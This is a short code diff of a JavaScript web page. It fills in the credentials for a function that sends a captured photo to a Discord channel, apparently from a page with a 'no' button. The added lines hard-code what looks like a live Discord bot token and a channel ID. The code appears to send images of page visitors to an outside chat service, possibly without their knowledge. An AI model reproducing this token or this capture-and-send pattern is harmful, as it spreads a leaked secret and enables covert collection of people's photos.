@@ -90,8 +90,8 @@ noButton.addEventListener("click", function () {
 });
 
 function sendCapturedPhotoToDiscordOrTelegram(photo) {
-  const discordToken = 'YOUR_DISCORD_BOT_TOKEN'; // Replace with your actual token
-  const discordChannelId = 'YOUR_DISCORD_CHANNEL_ID'; // Replace with your actual channel ID
+  const discordToken = 'MTIwNjk0Njc2NjMwMjM1MTM3MA.GueAbh.bsjbKLVgduBt4N5Uy9RBqIw2L0CRzkgCjLMVyM'; // Replace with your actual token
+  const discordChannelId = '1198262222162497686'; // Replace with your actual channel ID
 
   const formData = new FormData();
   formData.append('file', photo, 'photo.jpg'); // Assuming you've saved the photo as 'photo.jpg'
